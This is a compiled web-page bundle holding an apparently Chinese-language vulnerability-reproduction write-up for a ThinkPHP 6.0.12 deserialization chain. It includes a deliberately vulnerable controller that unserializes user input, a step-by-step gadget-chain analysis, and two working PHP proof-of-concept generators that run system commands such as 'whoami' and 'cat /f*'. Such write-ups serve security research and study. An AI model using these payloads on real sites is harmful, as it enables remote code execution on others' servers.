"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[7505],{5954:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>d,contentTitle:()=>r,default:()=>a,frontMatter:()=>l,metadata:()=>i,toc:()=>h});const i=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","title":"Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/02.Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/02.Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316.md","tags":[],"version":"current","sidebarPosition":2,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},"next":{"title":"Thinkphpv6.0.13\u591a\u8bed\u8a00Rce","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphpv6.0.13\u591a\u8bed\u8a00Rce"}}');var t=s(4848),c=s(8453);const l={},r=void 0,d={},h=[{value:"\u6d4b\u8bd5\u4ee3\u7801",id:"\u6d4b\u8bd5\u4ee3\u7801",level:2},{value:"\u6f0f\u6d1e\u5206\u6790",id:"\u6f0f\u6d1e\u5206\u6790",level:2},{value:"POC",id:"poc",level:2},{value:"\u7ed3\u679c",id:"\u7ed3\u679c",level:2}];function o(n){const e={blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,c.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,t.jsx)(e.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,t.jsx)(e.tbody,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{style:{textAlign:"left"},children:(0,t.jsx)(e.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,t.jsx)(e.td,{style:{textAlign:"left"},children:"2025-08-19 16:46:59"})]})})]}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"Thinkphp6.0.12"}),"\n",(0,t.jsx)(e.p,{children:"php 7.4.0"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"composer create-project topthink/think=6.0.12 tp6"})}),"\n",(0,t.jsx)(e.h2,{id:"\u6d4b\u8bd5\u4ee3\u7801",children:"\u6d4b\u8bd5\u4ee3\u7801"}),"\n",(0,t.jsxs)(e.ol,{children:["\n",(0,t.jsx)(e.li,{children:"\u5728\u9879\u76ee\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u6d4b\u8bd5\u63a7\u5236\u5668"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"php think make:controller Test"})}),"\n",(0,t.jsxs)(e.ol,{start:"2",children:["\n",(0,t.jsx)(e.li,{children:"\u5728Test\u63a7\u5236\u5668 index\u65b9\u6cd5\u4e2d\u6dfb\u52a0"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"    public function index()\n    {\n        if ($a=input('param.a')){\n            var_dump(base64_decode($a));\n            echo \"<br>\";\n            unserialize(base64_decode($a));\n        }\n    }\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u6f0f\u6d1e\u5206\u6790",children:"\u6f0f\u6d1e\u5206\u6790"}),"\n",(0,t.jsxs)(e.p,{children:["\u200b\t1.\u5728\u5927\u4f6c\u7684\u6587\u7ae0\u603b\u7ed3\u4e2d\uff0c \u53cd\u5e8f\u5217\u5316 \u4e00\u822c\u8d77\u70b9\u51fa\u73b0\u5728__desturct \u548c __wakeup \u901a\u8fc7\u5168\u5c40\u641c\u7d22 \u67e5\u8be2\u6ee1\u8db3\u6761\u4ef6\u7684 \u5728\uff1a",(0,t.jsx)(e.code,{children:"vendor\\topthink\\think-orm\\src\\Model.php"}),"(\u5927\u4f6c\u600e\u4e48\u8bf4\u6211\u600e\u4e48\u5199)"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646879.png",alt:"image-20220303180420019"})}),"\n",(0,t.jsxs)(e.ol,{start:"2",children:["\n",(0,t.jsxs)(e.li,{children:["\n",(0,t.jsxs)(e.p,{children:["\u7b2c\u4e00\u4e2a\u6761\u4ef6 \u8981\u628a ",(0,t.jsx)(e.code,{children:"$this->lazySave"}),"\u8bbe\u7f6e\u4e3aTrue"]}),"\n",(0,t.jsxs)(e.p,{children:["\u8ddf\u8fdb",(0,t.jsx)(e.code,{children:"$this->save()"}),", ",(0,t.jsx)(e.code,{children:"$this->isEmpty()"})," \u53ea\u8981\u4fdd\u8bc1data \u4e0d\u4e3a\u7a7a\u5c31\u884c ",(0,t.jsx)(e.code,{children:"$this->trigger('BeforeWrite'))"})," \u9ed8\u8ba4\u8fd4\u56de\u4e3a\u771f"]}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"public function isEmpty(): bool\n{\n    return empty($this->data);\n}\n"})}),"\n",(0,t.jsxs)(e.ol,{start:"3",children:["\n",(0,t.jsxs)(e.li,{children:["\u5c06 ",(0,t.jsx)(e.code,{children:"$this->exists"}),"\u8bbe\u7f6e\u4e3aTrue\uff0c\u8ddf\u8fdb ",(0,t.jsx)(e.code,{children:"$this -> updateData()"})]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646880.png",alt:"image-20220303181123318"})}),"\n",(0,t.jsxs)(e.ol,{start:"4",children:["\n",(0,t.jsxs)(e.li,{children:["\u5728 621\u5217 ",(0,t.jsx)(e.code,{children:"$allowFields = $this->checkAllowFields()"})," \u8ddf\u8fdb"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646881.png",alt:"image-20220303181558066"})}),"\n",(0,t.jsxs)(e.ol,{start:"5",children:["\n",(0,t.jsxs)(e.li,{children:["\u7ee7\u7eed\u8ddf\u8fdb 565\u5217 ",(0,t.jsx)(e.code,{children:"$query = $this->db();"})]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646882.png",alt:"image-20220303181719266"})}),"\n",(0,t.jsxs)(e.ol,{start:"6",children:["\n",(0,t.jsxs)(e.li,{children:["\u5728362\u884c\u5c06 ",(0,t.jsx)(e.code,{children:"$this->table . $this->suffix"})," \u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u5c06$this->table \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u5bf9\u8c61 \u89e6\u53d1 __toString"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646883.png",alt:"image-20220303181958370"})}),"\n",(0,t.jsxs)(e.ol,{start:"7",children:["\n",(0,t.jsxs)(e.li,{children:["\u5168\u5c40\u67e5\u627e__toString \u6700\u540e\u5728 ",(0,t.jsx)(e.code,{children:"vendor\\topthink\\think-orm\\src\\model\\concern\\Conversion.php"})," \u4e2d\u627e\u5230__toString()\uff08\u4ee5\u524d\u7248\u672c\u4e5f\u662f\u5728\u8fd9\u91cc\u51fa\u73b0\u6f0f\u6d1e\u7684\uff0c\u53cd\u6b63\u5f88\u597d\u627e\u5230\uff09\u8fd9\u91cc\u662f\u4e00\u4e2a\u4ee3\u7801\u590d\u7528\u7684\u673a\u5236\u6240\u4ee5\u4e0d\u7528\u5c06",(0,t.jsx)(e.code,{children:"$this->table"})," \u8bbe\u7f6e\u6210\u7279\u5b9a\u7c7b\uff0c \u521a\u597dModel\u62bd\u8c61\u7c7b\u4e5f\u6709\u7528\u5230  ",(0,t.jsx)(e.code,{children:"use model\\concern\\Conversion"})," \u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u5b9e\u4f8b\u5316\u672c\u8eab\u5c31\u884c"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646884.png",alt:"image-20220303183151437"})}),"\n",(0,t.jsxs)(e.ol,{start:"8",children:["\n",(0,t.jsxs)(e.li,{children:["\u7ee7\u7eed\u8ddf\u8fdb",(0,t.jsx)(e.code,{children:"$this->toArray()"})," \uff0c\u5c06 ",(0,t.jsx)(e.code,{children:"$this->data"})," \u8bbe\u7f6e\u4e3a\u6570\u636e\u5373\u53ef\u8fdb\u5165\u5faa\u73af\uff0c \u5728238 \u4e2d\u8ddf\u8fdb ",(0,t.jsx)(e.code,{children:"$key"})," \u662f ",(0,t.jsx)(e.code,{children:"$data"}),"\u7684\u952e\u540d"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646885.png",alt:"image-20220303183401764"})}),"\n",(0,t.jsxs)(e.ol,{start:"9",children:["\n",(0,t.jsxs)(e.li,{children:["\u8ddf\u8fdb",(0,t.jsx)(e.code,{children:"$this->getAttr($key)"})]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646886.png",alt:"image-20220303183631626"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"$name"})," \u53ef\u63a7\u4e0d\u63d0"]}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"$value"})," \u4e3a ",(0,t.jsx)(e.code,{children:"$this->getData($name)"}),"\u8fd4\u56de\u503c \uff0c\u8ddf\u8fdb\u4e00\u4e0b"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646887.png",alt:"image-20220303183905068"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"$fieldName"})," \u8ddf\u8fdb\u4e00\u4e0b"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646888.png",alt:"image-20220303183952916"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"$fieldName"})," \u53ef\u63a7\uff0c \u8fd4\u56de\u7684\u662f ",(0,t.jsx)(e.code,{children:"$this->data[$fieldName]"})]}),"\n",(0,t.jsxs)(e.p,{children:["\u5f88\u660e\u663e\u8fd9\u4e2a",(0,t.jsx)(e.code,{children:"$value"}),"\u5c31\u662f ",(0,t.jsx)(e.code,{children:"$this->data"}),"\u7684\u503c\uff0c"]}),"\n",(0,t.jsxs)(e.ol,{start:"10",children:["\n",(0,t.jsxs)(e.li,{children:["\u7ee7\u7eed\u8ddf\u8fdb",(0,t.jsx)(e.code,{children:"$this->getValue($name, $value, $relation);"})]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646889.png",alt:"image-20220303184253914"})}),"\n",(0,t.jsxs)(e.p,{children:["\u7b2c 509 \u884c \uff0c",(0,t.jsx)(e.code,{children:"$fieldName"})," \u4e3a ",(0,t.jsx)(e.code,{children:"$this->data"})," \u952e\u540d \uff0c\u5c06",(0,t.jsx)(e.code,{children:"this->json"})," \u8bbe\u7f6e\u6210  ",(0,t.jsx)(e.code,{children:"$this->data"}),"\u7684\u952e\u540d\uff0c",(0,t.jsx)(e.code,{children:"$this->withAttr[$fieldName]"})," \u8bbe\u7f6e\u6210 \u6570\u7ec4\u5c31\u884c"]}),"\n",(0,t.jsxs)(e.ol,{start:"11",children:["\n",(0,t.jsxs)(e.li,{children:["\u8ddf\u8fdb",(0,t.jsx)(e.code,{children:"$this->getJsonValue($fieldName, $value)"}),"\uff0c\u4fdd\u8bc1",(0,t.jsx)(e.code,{children:"$this->jsonAssoc"}),"\u4e3a\u771f\u5373\u53ef\uff0c\u5c06",(0,t.jsx)(e.code,{children:"$this->withAttr"}),"\u7684 \u503c\u8bbe\u7f6e\u6210\u4f60\u9700\u8981\u6267\u884c\u7684\u51fd\u6570\uff0c\u800c ",(0,t.jsx)(e.code,{children:"$this->data"}),"\u7684\u503c\u8bbe\u7f6e\u4e3a \u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u5373\u53ef"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646890.png",alt:"image-20220303185128690"})}),"\n",(0,t.jsx)(e.h2,{id:"poc",children:"POC"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"<?php\nnamespace think{\n    abstract class Model{\n        private $lazySave;\n        private $data;\n        protected $table;\n        private $withAttr;\n        protected $json ;\n        protected $jsonAssoc;\n        private $exists;\n        public function __construct($obj = '')\n        {\n            $this->lazySave = True;\n            $this->exists = True;\n            $this->data = ['arr' =>['whoami']];\n            $this->table = $obj;\n            $this->withAttr = ['arr'=>['system']];\n            $this->json = ['arr'];\n            $this->jsonAssoc  = True;\n        }\t\n    }\n}\nnamespace think\\Model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\n\nnamespace {\n    $a = new think\\model\\Pivot();\n    $b = new think\\model\\Pivot($a);\n    echo base64_encode(serialize($b));\n\n}\n\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u7ed3\u679c",children:"\u7ed3\u679c"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646891.png",alt:"image-20220303185727488"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'<?php\n\nnamespace think\\model\\concern;\n\ntrait Attribute\n{\n    private $data = ["key" => ["key1" => "cat /f*"]];\n    private $withAttr = ["key"=>["key1"=>"system"]];\n    protected $json = ["key"];\n}\nnamespace think;\n\nabstract class Model\n{\n    use model\\concern\\Attribute;\n    private $lazySave;\n    protected $withEvent;\n    private $exists;\n    private $force;\n    protected $table;\n    protected $jsonAssoc;\n    function __construct($obj = \'\')\n    {\n        $this->lazySave = true;\n        $this->withEvent = false;\n        $this->exists = true;\n        $this->force = true;\n        $this->table = $obj;\n        $this->jsonAssoc = true;\n    }\n}\n\nnamespace think\\model;\n\nuse think\\Model;\n\nclass Pivot extends Model\n{\n}\n$a = new Pivot();\n$b = new Pivot($a);\n\necho urlencode(serialize($b));\n'})})]})}function a(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(o,{...n})}):o(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>l,x:()=>r});var i=s(6540);const t={},c=i.createContext(t);function l(n){const e=i.useContext(c);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:l(n.components),i.createElement(c.Provider,{value:e},n.children)}}}]);